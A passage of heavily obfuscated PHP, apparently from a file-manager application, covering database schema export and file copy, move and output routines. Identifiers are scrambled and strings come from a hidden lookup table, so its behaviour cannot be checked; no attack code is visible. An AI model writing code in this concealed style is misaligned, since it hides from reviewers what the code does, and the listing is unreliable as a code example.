($ßí®Øå as $”’ÌË®à) { $›Äº–áæ = $this->sqlFromMysql($”’ÌË®à); if (!$›Äº–áæ[$‘”ËÕ”¬[879]]) { continue; } fwrite($úÀöòï, $›Äº–áæ[$‘”ËÕ”¬[879]] . PHP_EOL . PHP_EOL); if (!in_array($”’ÌË®à, $ğ«¾–¦¾)) { fwrite($’Ä¤çµÕ, $›Äº–áæ[$‘”ËÕ”¬[13]] . PHP_EOL . PHP_EOL); } } } fclose($úÀöòï); fclose($’Ä¤çµÕ); $‡ñßíş¬ = array($‘”ËÕ”¬[879] => $¿¨Œ¨Â¨, $‘”ËÕ”¬[13] => $­âô‚ëÌ); return $öÉ Ğ§Ì ? $‡ñßíş¬[$öÉ Ğ§Ì] : $‡ñßíş¬; } public function dbType($Å™¢¿ÜÉ = false) { $‘”­›èè =& $_SERVER[³Ôà×Ó]; $î¢ß›×Ÿ = $Å™¢¿ÜÉ ? $GLOBALS[$‘”­›èè[6]][$‘”­›èè[21]] : $this->database; $î¢ß›×Ÿ = array_change_key_case($î¢ß›×Ÿ); $ã”°Ìİ¡ = $î¢ß›×Ÿ[$‘”­›èè[1042]]; if ($ã”°Ìİ¡ == $‘”­›èè[1039]) { $Ï¡æ¢Îî = explode($‘”­›èè[4], $î¢ß›×Ÿ[$‘”­›èè[1048]]); $ã”°Ìİ¡ = $Ï¡æ¢Îî[0]; } $ß±İÁÔÄ = array($‘”­›èè[1173] => $‘”­›èè[13], $‘”­›èè[987] => $‘”­›èè[879]); if (isset($ß±İÁÔÄ[$ã”°Ìİ¡])) { $ã”°Ìİ¡ = $ß±İÁÔÄ[$ã”°Ìİ¡]; } return $ã”°Ìİ¡; } public function sqlFromMysql($µ¢¸¡Šê, $Øû÷íû = '') { $—¡œÄ¿ =& $_SERVER[³Ôà×Ó]; $ÏÔÙª‚¶ = $this->model()->db(); $äæ¢Ÿ£ = $ÏÔÙª‚¶->query($—¡œÄ¿[1174] . $µ¢¸¡Šê . $—¡œÄ¿[470]); if (!$äæ¢Ÿ£ || !$äæ¢Ÿ£[0]) { return !1; } $ƒ±°ÇÆí = _get($äæ¢Ÿ£[0], $—¡œÄ¿[1175], $—¡œÄ¿[12]); if (!$ƒ±°ÇÆí) { return !1; } $¨­ŠÒÀÙ = "\x44\122\117\x50\40\124\101\102\114\x45\40\x49\106\40\x45\130\111\123\x54\x53\x20\140{$µ¢¸¡Šê}\140\x3b" . PHP_EOL . $ƒ±°ÇÆí . $—¡œÄ¿[74]; if ($Øû÷íû && $Øû÷íû == $—¡œÄ¿[879]) { return $¨­ŠÒÀÙ; } $Í½é— = array_change_key_case($GLOBALS[$—¡œÄ¿[6]][$—¡œÄ¿[21]]); $‰îùŸÊš = $Í½é—[$—¡œÄ¿[1047]]; $‡­ØÑ® = $—¡œÄ¿[1176] . $‰îùŸÊš . $—¡œÄ¿[1177] . $µ¢¸¡Šê . $—¡œÄ¿[58]; $ª‚ÀÂÑ÷ = $—¡œÄ¿[1178] . $µ¢¸¡Šê . $—¡œÄ¿[975]; $÷ÖíéÅ = $ÏÔÙª‚¶->query($‡­ØÑ®); if (empty($÷ÖíéÅ)) { $¯®ÒâÇã = array($—¡œÄ¿[879] => $—¡œÄ¿[12], $—¡œÄ¿[13] => $—¡œÄ¿[12]); return $Øû÷íû ? $¯®ÒâÇã[$Øû÷íû] : $¯®ÒâÇã; } $éıò°ìƒ = $ÏÔÙª‚¶->query($ª‚ÀÂÑ÷); $®óÆ¤Éû = $—¡œÄ¿[12]; $™ñ™¹Šˆ = array(); foreach ($éıò°ìƒ as $·»º‹½Ò) { if (!$®óÆ¤Éû && $·»º‹½Ò[$—¡œÄ¿[1179]] == $—¡œÄ¿[1180]) { $®óÆ¤Éû = $·»º‹½Ò[$—¡œÄ¿[1181]]; } if (isset($™ñ™¹Šˆ[$·»º‹½Ò[$—¡œÄ¿[1179]]])) { $™ñ™¹Šˆ[$·»º‹½Ò[$—¡œÄ¿[1179]]][$—¡œÄ¿[1182]][] = $·»º‹½Ò[$—¡œÄ¿[1181]]; continue; } $™ñ™¹Šˆ[$·»º‹½Ò[$—¡œÄ¿[1179]]] = array($—¡œÄ¿[1183] => $·»º‹½Ò[$—¡œÄ¿[1179]], $—¡œÄ¿[1182] => array($·»º‹½Ò[$—¡œÄ¿[1181]]), $—¡œÄ¿[1184] => $·»º‹½Ò[$—¡œÄ¿[1185]] == $—¡œÄ¿[91] ? 0 : 1); } $àÌÙ¯Ôş = array(); foreach ($™ñ™¹Šˆ as $·»º‹½Ò) { $°Ã÷Ìğú = $·»º‹½Ò[$—¡œÄ¿[1183]] == $—¡œÄ¿[1180]; $‡¡·™ÏË = array($—¡œÄ¿[1186], $·»º‹½Ò[$—¡œÄ¿[1184]] == $—¡œÄ¿[91] && !$°Ã÷Ìğú ? $—¡œÄ¿[1187] : $—¡œÄ¿[12], $—¡œÄ¿[1188], $—¡œÄ¿[1189] . $µ¢¸¡Šê . $—¡œÄ¿[11] . ($°Ã÷Ìğú ? $—¡œÄ¿[1190] : $·»º‹½Ò[$—¡œÄ¿[1183]]) . $—¡œÄ¿[121], $—¡œÄ¿[1191], $—¡œÄ¿[121] . $µ¢¸¡Šê . $—¡œÄ¿[121], $—¡œÄ¿[1192] . implode($—¡œÄ¿[1193], $·»º‹½Ò[$—¡œÄ¿[1182]]) . $—¡œÄ¿[1194]); $àÌÙ¯Ôş[] = implode($—¡œÄ¿[53], $‡¡·™ÏË) . $—¡œÄ¿[74]; } $ŞÁÄ·¸ı = array(); $®´–¯ß = array($—¡œÄ¿[1195] => $—¡œÄ¿[1196], $—¡œÄ¿[1196] => $—¡œÄ¿[1196], $—¡œÄ¿[364] => $—¡œÄ¿[391], $—¡œÄ¿[363] => $—¡œÄ¿[391]); foreach ($÷ÖíéÅ as $·»º‹½Ò) { $‡¡·™ÏË = array($—¡œÄ¿[121] . $·»º‹½Ò[$—¡œÄ¿[1197]] . $—¡œÄ¿[121], isset($®´–¯ß[$·»º‹½Ò[$—¡œÄ¿[1198]]]) ? $®´–¯ß[$·»º‹½Ò[$—¡œÄ¿[1198]]] : $·»º‹½Ò[$—¡œÄ¿[1199]], $·»º‹½Ò[$—¡œÄ¿[1200]] == $—¡œÄ¿[973] ? $—¡œÄ¿[1201] : $—¡œÄ¿[1202], $·»º‹½Ò[$—¡œÄ¿[1197]] == $®óÆ¤Éû ? $—¡œÄ¿[1203] : $—¡œÄ¿[12], $·»º‹½Ò[$—¡œÄ¿[1024]] ? strtoupper(str_replace($—¡œÄ¿[11], $—¡œÄ¿[12], $·»º‹½Ò[$—¡œÄ¿[1024]])) : $—¡œÄ¿[12]); $ŞÁÄ·¸ı[] = trim(implode($—¡œÄ¿[53], $‡¡·™ÏË)); } $ûÅÚÁ«ò = array($—¡œÄ¿[1204] . $µ¢¸¡Šê . $—¡œÄ¿[1205], $—¡œÄ¿[1206] . $µ¢¸¡Šê . $—¡œÄ¿[1207], implode($—¡œÄ¿[50] . PHP_EOL, $ŞÁÄ·¸ı), $—¡œÄ¿[1021]); $à¡ŒüÀâ = implode(PHP_EOL, array_merge($ûÅÚÁ«ò, $àÌÙ¯Ôş)); if ($Øû÷íû && $Øû÷íû == $—¡œÄ¿[13]) { return $à¡ŒüÀâ; } $¯®ÒâÇã = array($—¡œÄ¿[879] => $¨­ŠÒÀÙ, $—¡œÄ¿[13] => $à¡ŒüÀâ); return $Øû÷íû ? $¯®ÒâÇã[$Øû÷íû] : $¯®ÒâÇã; } public function sqlFromSqlite($òÎŸ©Âã, $€İÅ«îœ = '') { $ğÁÜÜÓ± =& $_SERVER[³Ôà×Ó]; $ÜÙÇàŸÏ = $this->model()->db(); $ßˆ¢ö‹ = "\x50\x52\x41\107\x4d\x41\40\x54\101\x42\x4c\105\137\x49\116\106\117\40\x28\47{$òÎŸ©Âã}\47\x29"; $Ñ—³¡ = "\x53\105\114\105\103\x54\x20\x2a\40\x46\122\117\x4d\x20\163\161\x6c\x69\164\145\137\x6d\141\163\x74\145\x72\x20\127\110\x45\x52\x45\40\164\x62\x6c\x5f\x6e\141\155\145\x20\75\40\47{$òÎŸ©Âã}\x27"; $ƒ¹Â‡é = $ÜÙÇàŸÏ->query($ßˆ¢ö‹); if (empty($ƒ¹Â‡é)) { $ŸİáŒ¯ = array($ğÁÜÜÓ±[879] => $ğÁÜÜÓ±[12], $ğÁÜÜÓ±[13] => $ğÁÜÜÓ±[12]); return $€İÅ«îœ ? $ŸİáŒ¯[$€İÅ«îœ] : $ŸİáŒ¯; } $ˆõÎ‹³µ = $ÜÙÇàŸÏ->query($Ñ—³¡); $òµÄÀ¨š = $½Ö¯ÈÍñ = array(); foreach ($ˆõÎ‹³µ as $‚ŸÉ‹Ï) { if ($‚ŸÉ‹Ï[$ğÁÜÜÓ±[33]] == $ğÁÜÜÓ±[356]) { $òµÄÀ¨š[] = $‚ŸÉ‹Ï[$ğÁÜÜÓ±[1208]]; } else { $½Ö¯ÈÍñ[$‚ŸÉ‹Ï[$ğÁÜÜÓ±[32]]] = $‚ŸÉ‹Ï[$ğÁÜÜÓ±[1208]]; } } $È×–çá™ = array_merge(array($ğÁÜÜÓ±[1204] . $òÎŸ©Âã . $ğÁÜÜÓ±[121]), $òµÄÀ¨š, array_values($½Ö¯ÈÍñ)); $È×–çá™ = implode($ğÁÜÜÓ±[74] . PHP_EOL, $È×–çá™) . $ğÁÜÜÓ±[74]; if ($€İÅ«îœ && $€İÅ«îœ == $ğÁÜÜÓ±[13]) { return $È×–çá™; } $ÍŸ¯¿¡¾ = array(); $£õ…¯éŠ = array($ğÁÜÜÓ±[1196] => $ğÁÜÜÓ±[1209], $ğÁÜÜÓ±[391] => $ğÁÜÜÓ±[1210]); $ÃË‚ŒØŠ = $ğÁÜÜÓ±[12]; foreach ($ƒ¹Â‡é as $‚ŸÉ‹Ï) { if ($‚ŸÉ‹Ï[$ğÁÜÜÓ±[57]] == $ğÁÜÜÓ±[91]) { $ÃË‚ŒØŠ = $‚ŸÉ‹Ï[$ğÁÜÜÓ±[32]]; } $¿Ü¬ëòÈ = array($ğÁÜÜÓ±[470] . $‚ŸÉ‹Ï[$ğÁÜÜÓ±[32]] . $ğÁÜÜÓ±[470], isset($£õ…¯éŠ[$‚ŸÉ‹Ï[$ğÁÜÜÓ±[33]]]) ? $£õ…¯éŠ[$‚ŸÉ‹Ï[$ğÁÜÜÓ±[33]]] : $‚ŸÉ‹Ï[$ğÁÜÜÓ±[33]], $‚ŸÉ‹Ï[$ğÁÜÜÓ±[35]] == $ğÁÜÜÓ±[91] ? $ğÁÜÜÓ±[1201] : $ğÁÜÜÓ±[1211] . $‚ŸÉ‹Ï[$ğÁÜÜÓ±[56]], $‚ŸÉ‹Ï[$ğÁÜÜÓ±[57]] == $ğÁÜÜÓ±[91] ? $ğÁÜÜÓ±[1212] : $ğÁÜÜÓ±[12]); $ÍŸ¯¿¡¾[] = trim(implode($ğÁÜÜÓ±[53], $¿Ü¬ëòÈ)); } foreach ($½Ö¯ÈÍñ as $Ñö«ËàŠ => $û¤˜­îŸ) { $à¤ÁÌÖë = str_replace($ğÁÜÜÓ±[1213] . $òÎŸ©Âã . $ğÁÜÜÓ±[11], $ğÁÜÜÓ±[12], $Ñö«ËàŠ); $æêº˜ô = str_replace(array($ğÁÜÜÓ±[121], $ğÁÜÜÓ±[1032]), $ğÁÜÜÓ±[470], substr($û¤˜­îŸ, stripos($û¤˜­îŸ, $ğÁÜÜÓ±[337]))); if ($à¤ÁÌÖë == $ğÁÜÜÓ±[1190]) { $ª…“ü€ = $ğÁÜÜÓ±[1214] . $ÃË‚ŒØŠ . $ğÁÜÜÓ±[1215]; } else { $ª…“ü€ = (stripos($à¤ÁÌÖë, $ğÁÜÜÓ±[11]) ? $ğÁÜÜÓ±[1216] : $ğÁÜÜÓ±[12]) . ($ğÁÜÜÓ±[1217] . $à¤ÁÌÖë . $ğÁÜÜÓ±[1218] . $æêº˜ô); } $ÍŸ¯¿¡¾[] = $ª…“ü€; } $¹áËÈÌ£ = array($ğÁÜÜÓ±[1219] . $òÎŸ©Âã . $ğÁÜÜÓ±[1220], $ğÁÜÜÓ±[1221] . $òÎŸ©Âã . $ğÁÜÜÓ±[1222], implode($ğÁÜÜÓ±[50] . PHP_EOL, $ÍŸ¯¿¡¾), $ğÁÜÜÓ±[1223]); $÷”¯ŒˆÄ = implode(PHP_EOL, $¹áËÈÌ£); if ($€İÅ«îœ && $€İÅ«îœ == $ğÁÜÜÓ±[879]) { return $÷”¯ŒˆÄ; } $ŸİáŒ¯ = array($ğÁÜÜÓ±[879] => $÷”¯ŒˆÄ, $ğÁÜÜÓ±[13] => $È×–çá™); return $€İÅ«îœ ? $ŸİáŒ¯[$€İÅ«îœ] : $ŸİáŒ¯; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÊıôúÂÙ, $ŠÄìïŸµ) { $¤ã©ö¼İ =& $_SERVER[³Ôà×Ó]; $¶Ñ©œ° = $ŠÄìïŸµ; $GLOBALS[$¤ã©ö¼İ[1224]] = $¤ã©ö¼İ[1225] . $ÊıôúÂÙ; Hook::trigger($¤ã©ö¼İ[1225] . $ÊıôúÂÙ . $¤ã©ö¼İ[1226], $¶Ñ©œ°); $ïÏóµ©Ö = self::driverMake($ŠÄìïŸµ[0]); if (!$ïÏóµ©Ö) { return !1; } if (method_exists($ïÏóµ©Ö, $ÊıôúÂÙ)) { $½©êş¨ = @call_user_func_array(array($ïÏóµ©Ö, $ÊıôúÂÙ), $ŠÄìïŸµ); } else { if (method_exists($ïÏóµ©Ö, $¤ã©ö¼İ[1227])) { $½©êş¨ = @call_user_func_array(array($ïÏóµ©Ö, $ÊıôúÂÙ), $ŠÄìïŸµ); } else { if (method_exists(self, $ÊıôúÂÙ)) { $½©êş¨ = @call_user_func_array(array(self, $ÊıôúÂÙ), $ŠÄìïŸµ); } else { $½©êş¨ = call_user_func_array(array(parent, $ÊıôúÂÙ), $ŠÄìïŸµ); } } } Hook::trigger($¤ã©ö¼İ[1225] . $ÊıôúÂÙ . $¤ã©ö¼İ[1228], $¶Ñ©œ°, $½©êş¨); return $½©êş¨; } public static function init($ßû½¤«ñ) { return self::driverMake($ßû½¤«ñ); } public static function copy($ï‘îØâ“, $Š¾ç¬½, $¤Œ¨—ìÌ = false, $Å–èÔøÁ = false) { return self::copyMoveStart($ï‘îØâ“, $Š¾ç¬½, $¤Œ¨—ìÌ, $_SERVER[³Ôà×Ó][627], $Å–èÔøÁ); } public static function move($Ğ —ğÌó, $ÖÕ‘¤êø, $ŒÑ­ã¬ê = false, $×«‹–§é = false) { return self::copyMoveStart($Ğ —ğÌó, $ÖÕ‘¤êø, $ŒÑ­ã¬ê, $_SERVER[³Ôà×Ó][629], $×«‹–§é); } private static function copyMoveStart($ùÚê‰, $“Öè½¨, $í‰ß§š‰, $½ëª’óå, $âÔ±¥†©) { $ˆ®ùé¥Ê =& $_SERVER[³Ôà×Ó]; $öÊˆè©Ü = array($ùÚê‰, $“Öè½¨, $í‰ß§š‰, $âÔ±¥†©); Hook::trigger($ˆ®ùé¥Ê[1225] . $½ëª’óå . $ˆ®ùé¥Ê[1226], $öÊˆè©Ü); $óºÇöÅ· = self::copyMove($ùÚê‰, $“Öè½¨, $í‰ß§š‰, $½ëª’óå, $âÔ±¥†©); Hook::trigger($ˆ®ùé¥Ê[1225] . $½ëª’óå . $ˆ®ùé¥Ê[1228], $öÊˆè©Ü, $óºÇöÅ·); return $óºÇöÅ·; } public static function saveFile($Ó´Ïğ‡, $ƒñ™ìÁ, $·˜´‚üÌ = true) { $®Şü‰£ =& $_SERVER[³Ôà×Ó]; $½™ÊœôÛ = self::info($ƒñ™ìÁ); $‚çÃ©¯ = self::driverMake($Ó´Ïğ‡); $€€ïŠ™‰ = self::driverMake($ƒñ™ìÁ); $ô˜ùâÂÙ = !1; if ($€€ïŠ™‰->pathParse[$®Şü‰£[1229]]) { $ô˜ùâÂÙ = $€€ïŠ™‰; $º³“‡Î³ = $€€ïŠ™‰->pathParse[$®Şü‰£[1229]]; $€€ïŠ™‰ = self::driverMake($º³“‡Î³); } if ($‚çÃ©¯->pathParse[$®Şü‰£[1229]]) { $‹‹›Š”• = $‚çÃ©¯->pathParse[$®Şü‰£[1229]]; $‚çÃ©¯ = self::driverMake($‹‹›Š”•); } $¸Ò¿Ğ© = $€€ïŠ™‰->pathFather($ƒñ™ìÁ); $¬µ“¾äƒ = !0; if (!$·˜´‚üÌ && self::driverIsSame($‚çÃ©¯, $€€ïŠ™‰)) { $¬µ“¾äƒ = !1; } $µ ×”Ì = self::copyFile($‚çÃ©¯, $Ó´Ïğ‡, $€€ïŠ™‰, $¸Ò¿Ğ©, $½™ÊœôÛ[$®Şü‰£[32]], $¬µ“¾äƒ); if ($ô˜ùâÂÙ) { $µ ×”Ì = $ô˜ùâÂÙ->getPathOuter($µ ×”Ì); } return $µ ×”Ì; } private static function copyMove($½„™–¡Õ, $‚İÅ¢, $¸Ç£––ä, $»šËµ•À, $ÂÂ³òÙ³ = false) { $³ÜØ™èó =& $_SERVER[³Ôà×Ó]; if (!$½„™–¡Õ || $½„™–¡Õ == $³ÜØ™èó[8] || !$‚İÅ¢) { return !1; } ignore_timeout(); $’é¡İÇÅ = self::driverMake($½„™–¡Õ); $¢¡¤úµŠ = self::driverMake($‚İÅ¢); $ßÒúïß÷ = $»šËµ•À == $³ÜØ™èó[629]; $ïÇ‰Äôµ = !1; if ($¢¡¤úµŠ->pathParse[$³ÜØ™èó[1229]]) { $ïÇ‰Äôµ = $¢¡¤úµŠ; $‚İÅ¢ = $¢¡¤úµŠ->pathParse[$³ÜØ™èó[1229]]; $¢¡¤úµŠ = self::driverMake($‚İÅ¢); } if ($’é¡İÇÅ->pathParse[$³ÜØ™èó[1229]]) { $½„™–¡Õ = $’é¡İÇÅ->pathParse[$³ÜØ™èó[1229]]; $’é¡İÇÅ = self::driverMake($½„™–¡Õ); } self::check($’é¡İÇÅ, $½„™–¡Õ, $¢¡¤úµŠ, $‚İÅ¢); Hook::trigger($³ÜØ™èó[1230], $’é¡İÇÅ, $½„™–¡Õ, $¢¡¤úµŠ, $‚İÅ¢); $â±Ç¾ö = self::driverIsSame($’é¡İÇÅ, $¢¡¤úµŠ); if ($â±Ç¾ö) { if ($»šËµ•À == $³ÜØ™èó[629] && !method_exists($¢¡¤úµŠ, $³ÜØ™èó[1231]) && trim($‚İÅ¢, $³ÜØ™èó[8]) == trim($¢¡¤úµŠ->pathFather($½„™–¡Õ), $³ÜØ™èó[8])) { if ($’é¡İÇÅ->pathThis($½„™–¡Õ) != $ÂÂ³òÙ³ && !$’é¡İÇÅ->isOsDriver()) { return $’é¡İÇÅ->rename($½„™–¡Õ, $ÂÂ³òÙ³); } return $¢¡¤úµŠ->getPathOuter($½„™–¡Õ); } if (method_exists($¢¡¤úµŠ, $»šËµ•À)) { return $¢¡¤úµŠ->{$»šËµ•À}($½„™–¡Õ, $‚İÅ¢, $¸Ç£––ä, $ÂÂ³òÙ³); } } if ($â±Ç¾ö && $»šËµ•À == $³ÜØ™èó[629] && $¢¡¤úµŠ->getType() == $³ÜØ™èó[109]) { $‚©øìî— = $¢¡¤úµŠ->movePath($½„™–¡Õ, $‚İÅ¢, $ÂÂ³òÙ³); if ($‚©øìî—) { return $‚©øìî—; } } $Ò•”ñµŠ = $’é¡İÇÅ->isFile($½„™–¡Õ); if (!$Ò•”ñµŠ && $¢¡¤úµŠ->getType() == $³ÜØ™èó[832] && $’é¡İÇÅ->getType() == $³ÜØ™èó[109]) { $‚©øìî— = $¢¡¤úµŠ->copyFolderFromIO($’é¡İÇÅ, $½„™–¡Õ, $‚İÅ¢, $¸Ç£––ä, $ßÒúïß÷, $ÂÂ³òÙ³); } else { $‚©øìî— = self::copyPath($’é¡İÇÅ, $½„™–¡Õ, $¢¡¤úµŠ, $‚İÅ¢, $¸Ç£––ä, $ßÒúïß÷, $Ò•”ñµŠ, $ÂÂ³òÙ³); } if ($‚©øìî— && $ßÒúïß÷) { $’é¡İÇÅ->remove($½„™–¡Õ); } if ($ïÇ‰Äôµ) { $‚©øìî— = $ïÇ‰Äôµ->getPathOuter($‚©øìî—); } return $‚©øìî—; } private static function check($öéïóéÃ, $Í°‘òû, $ªÒıúˆ, &$İò©‘ÙÔ) { $ğçóõÅğ =& $_SERVER[³Ôà×Ó]; if (self::driverIsSame($öéïóéÃ, $ªÒıúˆ) && $öéïóéÃ->isFolder($Í°‘òû) && $öéïóéÃ->isParentOf($Í°‘òû, $İò©‘ÙÔ)) { show_json(LNG($ğçóõÅğ[1232]), !1); } if (!$öéïóéÃ->exist($Í°‘òû)) { show_json(LNG($ğçóõÅğ[108]), !1); } } private static function copyPath($óğò¥Ş, $™¦Îê, $íƒâÄ’, $óÈŠø˜ï, $ª¤¡õ‚ˆ, $¬“ˆ…í, $ÔãÃ»¤´, $îÉó‹œ° = false, $ÍÙ˜Ş«‘ = true) { $Ü¼ˆÓ¬  =& $_SERVER[³Ôà×Ó]; $“·óß¡¸ = empty($îÉó‹œ°) && $îÉó‹œ° !== $Ü¼ˆÓ¬ [228] ? $óğò¥Ş->pathThis($™¦Îê) : $îÉó‹œ°; if ($ª¤¡õ‚ˆ) { $ÕÄ‘Ûşü = $íƒâÄ’->fileNameExist($óÈŠø˜ï, $“·óß¡¸); $­¸ôÃÍ = $“·óß¡¸; $“·óß¡¸ = $íƒâÄ’->fileNameAuto($óÈŠø˜ï, $“·óß¡¸, $ª¤¡õ‚ˆ, !$ÔãÃ»¤´); if (!$ÕÄ‘Ûşü || $­¸ôÃÍ != $“·óß¡¸) { $ª¤¡õ‚ˆ = !1; } if ($ÍÙ˜Ş«‘ && !$ª¤¡õ‚ˆ) { $íƒâÄ’->_data[$Ü¼ˆÓ¬ [1233]] = !0; } } if ($ÔãÃ»¤´) { return self::copyFile($óğò¥Ş, $™¦Îê, $íƒâÄ’, $óÈŠø˜ï, $“·óß¡¸, $¬“ˆ…í); } if ($ª¤¡õ‚ˆ == REPEAT_RENAME_FOLDER) { $ª¤¡õ‚ˆ = !1; } $•Ãù°’ = rtrim($óÈŠø˜ï, $Ü¼ˆÓ¬ [8]) . $Ü¼ˆÓ¬ [8] . $“·óß¡¸; $Š¥¤¯Ïõ = $íƒâÄ’->mkdir($íƒâÄ’->getPath($•Ãù°’), $ª¤¡õ‚ˆ); $óÈŠø˜ï = $íƒâÄ’->getPathInner($Š¥¤¯Ïõ); $Ó×¸¼¥³ = $óğò¥Ş->listPath($™¦Îê, !0); $Ó×¸¼¥³ = is_array($Ó×¸¼¥³) ? $Ó×¸¼¥³ : array($Ü¼ˆÓ¬ [86] => array(), $Ü¼ˆÓ¬ [85] => array()); $±ëå•ºú = array_merge($Ó×¸¼¥³[$Ü¼ˆÓ¬ [86]], $Ó×¸¼¥³[$Ü¼ˆÓ¬ [85]]); foreach ($±ëå•ºú as $ı¿Œ‰™Ä) { $·±½óÀ = $ı¿Œ‰™Ä[$Ü¼ˆÓ¬ [33]] == $Ü¼ˆÓ¬ [230]; $™¦Îê = $óğò¥Ş->getPathInner($ı¿Œ‰™Ä[$Ü¼ˆÓ¬ [87]]); $÷‚…ßÇ± = self::copyPath($óğò¥Ş, $™¦Îê, $íƒâÄ’, $óÈŠø˜ï, $ª¤¡õ‚ˆ, $¬“ˆ…í, $·±½óÀ, !1, !1); if (!$÷‚…ßÇ±) { IO::errorTips($Ü¼ˆÓ¬ [1234] . $™¦Îê . $Ü¼ˆÓ¬ [73] . $óÈŠø˜ï); } } self::copyMoveKeepInfo($óğò¥Ş, $™¦Îê, $Š¥¤¯Ïõ); return $Š¥¤¯Ïõ; } private static function copyFile($¹°½ Õİ, $ÁÀ˜ÈÊã, $àóç–ß, $Õ¢ò†Ó¨, $şÇø¶âà, $ÈÕÎ ö) { $æÖ˜éŠ˜ =& $_SERVER[³Ôà×Ó]; $Õ¢ò†Ó¨ = $àóç–ß->getPath(rtrim($Õ¢ò†Ó¨, $æÖ˜éŠ˜[8]) . $æÖ˜éŠ˜[8] . $şÇø¶âà); $ãÏ§¾øŠ = $æÖ˜éŠ˜[1235] . time() . rand_string(5); Hook::trigger($æÖ˜éŠ˜[1236], $¹°½ Õİ, $ÁÀ˜ÈÊã, $àóç–ß, $Õ¢ò†Ó¨, $şÇø¶âà, $ãÏ§¾øŠ); if (self::driverIsSame($¹°½ Õİ, $àóç–ß)) { if ($ÈÕÎ ö) { $½» ’ó¢ = $àóç–ß->moveFile($ÁÀ˜ÈÊã, $Õ¢ò†Ó¨); } else { $½» ’ó¢ = $àóç–ß->copyFile($ÁÀ˜ÈÊã, $Õ¢ò†Ó¨); } Hook::trigger($æÖ˜éŠ˜[1237], $¹°½ Õİ, $ÁÀ˜ÈÊã, $àóç–ß, $Õ¢ò†Ó¨, $şÇø¶âà, $½» ’ó¢); self::copyMoveKeepInfo($¹°½ Õİ, $ÁÀ˜ÈÊã, $½» ’ó¢); return $½» ’ó¢; } $´·”¯Š = TEMP_FILES; if ($GLOBALS[$æÖ˜éŠ˜[6]][$æÖ˜éŠ˜[92]][$æÖ˜éŠ˜[871]]) { $´·”¯Š = $GLOBALS[$æÖ˜éŠ˜[6]][$æÖ˜éŠ˜[92]][$æÖ˜éŠ˜[871]]; } $‹¥á›û = $´·”¯Š; mk_dir($‹¥á›û); $Œæõµ¦Ñ = $‹¥á›û . $ãÏ§¾øŠ; $Ëº–å¡ = $Œæõµ¦Ñ; $Œæõµ¦Ñ = $¹°½ Õİ->download($ÁÀ˜ÈÊã, $Œæõµ¦Ñ); $Œæõµ¦Ñ = $¹°½ Õİ->iconvApp($Œæõµ¦Ñ); if (substr($Œæõµ¦Ñ, strlen($´·”¯Š)) == $´·”¯Š) { $ÈÕÎ ö = !0; } $½» ’ó¢ = $àóç–ß->upload($Õ¢ò†Ó¨, $Œæõµ¦Ñ, $ÈÕÎ ö); self::remove($Ëº–å¡); Hook::trigger($æÖ˜éŠ˜[1237], $¹°½ Õİ, $ÁÀ˜ÈÊã, $àóç–ß, $Õ¢ò†Ó¨, $şÇø¶âà, $½» ’ó¢); self::copyMoveKeepInfo($¹°½ Õİ, $ÁÀ˜ÈÊã, $½» ’ó¢); return $½» ’ó¢; } private static function copyMoveKeepInfo($û‹¿ç§¥, $ØÅèÌù, $æØëì¹©) { if (!$æØëì¹©) { return; } $â’š›µÚ = $û‹¿ç§¥->info($ØÅèÌù); if (!is_array($â’š›µÚ)) { return; } IO::setModifyTime($æØëì¹©, $â’š›µÚ[$_SERVER[³Ôà×Ó][88]]); } public static function pathFather($¼„ş‹ÑÄ) { $ë‚ê‹ëï = IO::init($¼„ş‹ÑÄ); $Å ı¼“À = $ë‚ê‹ëï->pathFather($ë‚ê‹ëï->path); return $ë‚ê‹ëï->getPathOuter($Å ı¼“À); } public static function fileOut($’ªàÜç, $¤Ì€ğ²À = false, $¡‡»¡°î = false, $¢£ªˆ÷ë = '') { $¬İ¬Éå¯ = self::driverMake($’ªàÜç); if ($¬İ¬Éå¯->isFileOutServer()) { return $¬İ¬Éå¯->fileOutServer($’ªàÜç, $¤Ì€ğ²À, $¡‡»¡°î, $¢£ªˆ÷ë); } return $¬İ¬Éå¯->fileOut($’ªàÜç, $¤Ì€ğ²À, $¡‡»¡°î, $¢£ªˆ÷ë); } public static function fileOutImage($æ÷°Öï„, $¢ğÍÖÁ• = 250) { $¢’ƒÜÈï = array(250, 600, 1200, 2000, 3000, 5000); for ($Ì˜” ‘ = 0; $Ì˜” ‘ < count($¢’ƒÜÈï); $Ì˜” ‘++) { if ($Ì˜” ‘ == 0 && $¢ğÍÖÁ• <= $¢’ƒÜÈï[$Ì˜” ‘]) { $¢ğÍÖÁ• = $¢’ƒÜÈï[$Ì˜” ‘]; break; } else { if ($¢ğÍÖÁ• > $¢’ƒÜÈï[$Ì˜” ‘ - 1] && $¢ğÍÖÁ• <= $¢’ƒÜÈï[$Ì˜” ‘]) { $¢ğÍÖÁ• = $¢’ƒÜÈï[$Ì˜” ‘]; break; } else { if ($Ì˜” ‘ == count($¢’ƒÜÈï) - 1 && $¢ğÍÖÁ• > $¢’ƒÜÈï[$Ì˜” ‘]) { $¢ğÍÖÁ• = $¢’ƒÜÈï[$Ì˜” ‘]; break; } } } } $¯ˆ­œÓÀ = self::driverMake($æ÷°Öï„); if ($¯ˆ­œÓÀ->isFileOutServer()) { return $¯ˆ­œÓÀ->fileOutImageServer($æ÷°Öï„, $¢ğÍÖÁ•); } return $¯ˆ­œÓÀ->fileOutImage($æ÷°Öï„, $¢ğÍÖÁ•); } private static function driverIsSame($Û”¢í€, $»î¦¾) { $ŒãÌ¤¡ò =& $_SERVER[³Ôà×Ó]; $§âÛÏç = $Û”¢í€->getType(); $ ¤˜¤¦Ò = $»î¦¾->getType(); if ($§âÛÏç != $ ¤˜¤¦Ò) { return !1; } if ($§âÛÏç == $ŒãÌ¤¡ò[832]) { return !0; } if ($§âÛÏç == $ŒãÌ¤¡ò[109]) { return !0; } if ($Û”¢í€->pathDriver == $»î¦¾->pathDriver) { return !0; } return !1; } public static function copyUpdate($×ûœÏÛ, $â¯ÛÕ») { $Û´µÃô­ =& $_SERVER[³Ôà×Ó]; if (!IO::exist($×ûœÏÛ)) { return !1; } if (!IO::exist($â¯ÛÕ»)) { IO::mkdir($â¯ÛÕ»); } $ó÷İ½ç = array_to_keyvalue(self::listAllSimple($×ûœÏÛ), $Û´µÃô­[87]); $Ùíùš› = array_to_keyvalue(self::listAllSimple($â¯ÛÕ»), $Û´µÃô­[87]); $Ñ®ˆ‹©‹ = array(); $ƒì‹¸¹ = array(); foreach ($ó÷İ½ç as 